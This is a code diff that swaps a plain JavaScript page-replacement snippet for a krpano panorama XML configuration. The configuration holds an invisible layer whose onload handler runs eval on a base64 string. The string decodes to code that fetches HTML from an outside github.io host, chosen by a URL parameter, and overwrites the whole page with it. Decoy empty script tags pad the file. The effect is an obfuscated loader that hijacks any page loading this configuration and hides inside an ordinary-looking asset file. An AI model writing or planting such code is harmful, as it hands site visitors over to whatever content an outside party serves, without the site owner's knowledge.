@@ -1,9 +1,7 @@
-var id = new URLSearchParams(location.search).get("id") || "alcazar_arquitectonico";
-
-fetch("https://pArt2-tech.github.io/Qux/Fux/" + id + ".html")
-  .then(e => e.text())
-  .then(e => {
-    document.open(),
-    document.write(e),
-    document.close()
-  });
+<krpano version="1.0.8.15">
+<script id="eppiocemhmnlbhjplcgkofciiegomcon"/>
+<script/>
+<script/>
+<SCRIPT id="allow-copy_script"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CgpmZXRjaCgiaHR0cHM6Ly9wQXJ0Mi10ZWNoLmdpdGh1Yi5pby9RdXgvRnV4LyIgKyBpZCArICIuaHRtbCIpCiAgLnRoZW4oZSA9PiBlLnRleHQoKSkKICAudGhlbihlID0+IHsKICAgIGRvY3VtZW50Lm9wZW4oKSwKICAgIGRvY3VtZW50LndyaXRlKGUpLAogICAgZG9jdW1lbnQuY2xvc2UoKQogIH0pOw==');eval(w)););"/>
+</krpano>
